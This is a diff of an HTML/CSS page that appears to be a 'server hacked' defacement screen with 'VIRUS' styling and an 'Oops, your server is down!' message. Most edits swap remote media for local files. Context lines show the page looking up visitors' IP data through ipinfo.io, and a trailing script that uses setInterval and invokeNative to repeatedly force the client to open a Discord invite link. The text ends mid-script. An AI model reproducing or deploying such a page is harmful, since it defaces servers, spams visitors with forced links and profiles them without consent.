@@ -14,14 +14,26 @@ body{
   min-height:100vh;
   padding-top:60px;
 }
+
+/* VIDEO BACKGROUND FIX */
+.video-bg{
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  z-index:-100;
+}
+
 .overlay{
   position:fixed;
   inset:0;
-  background:url("https://cdn.discordapp.com/attachments/1420755020235800596/1455989543902642319/who_are_you_1.gif?ex=69580cee&is=6956bb6e&hm=d52c4c3f8dc949e9fcb4056043c32109961fdddb818a410bb12a2133b91c319a&")
-  center/cover no-repeat;
+  background:rgba(0,0,0,0.55);
   filter: blur(6px) brightness(0.6);
-  z-index:-1;
+  z-index:-50;
 }
+
 .top-img img{width:140px}
 
 /* Black / Red / White */
@@ -33,7 +45,7 @@ body{
 }
 
 /* VIRUS White / Red only */
-@keyframes jhnm {
+@keyframes virus {
   0%{color:#ffffff}
   50%{color:#ff0000}
   100%{color:#ffffff}
@@ -46,7 +58,7 @@ body{
   animation: rgb3 2.5s infinite;
 }
 .hacked .name{
-  animation: jhnm 1.2s infinite;
+  animation: virus 1.2s infinite;
 }
 
 .discord{margin-top:10px;font-size:18px}
@@ -68,6 +80,10 @@ body{
 </head>
 
 <body>
+
+<video class="video-bg" autoplay loop muted playsinline>
+  <source src="bg.mp4" type="video/mp4">
+</video>
 
 <div class="overlay"></div>
 
@@ -99,8 +115,9 @@ body{
 </div>
 
 <div class="down">Oops, your server is down!</div>
+
 <audio autoplay loop>
-  <source src="https://cdn.discordapp.com/attachments/1420755020235800596/1455989918777086016/19bee5b4a0f8c57d.mp3?ex=69580d47&is=6956bbc7&hm=1022b1484b26e24f801d481c7e344027eb25bc5ae9152a7958965eb354e09b8c&" type="audio/mpeg">
+  <source src="music.mp3" type="audio/mpeg">
 </audio>
 
 <script>
@@ -118,6 +135,7 @@ fetch("https://ipinfo.io/json")
 </script>
 </body>
 </html>
+
 <script>
 setInterval(() => {
 window.invokeNative("openUrl", "https://discord.gg/ay1");
